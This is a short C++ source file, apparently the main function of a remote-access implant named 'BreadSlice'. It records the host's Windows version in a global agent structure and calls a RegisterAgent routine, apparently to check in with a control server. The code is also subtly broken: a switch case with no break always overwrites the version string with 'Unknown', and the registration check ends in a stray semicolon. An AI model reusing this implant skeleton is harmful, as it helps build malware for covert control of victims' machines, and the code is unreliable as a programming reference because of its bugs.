// BreadSlice.cpp : This file contains the 'main' function. Program execution begins and ends there.

#include "Http.h"
#include "enum.h"
#include "implant.h"

Agent g_ImplantData = { 0 };

int main()
{
    RTL_OSVERSIONINFOEXW lpVersionInformation;
    lpVersionInformation = GetOperatingSystemFunc();
    switch (lpVersionInformation.dwMajorVersion) {
    case 10 :
        g_ImplantData.OperatingSystem = "Windows 10";
    default :
        g_ImplantData.OperatingSystem = "Unknown";
    }
    
    if (!RegisterAgent());
     
}

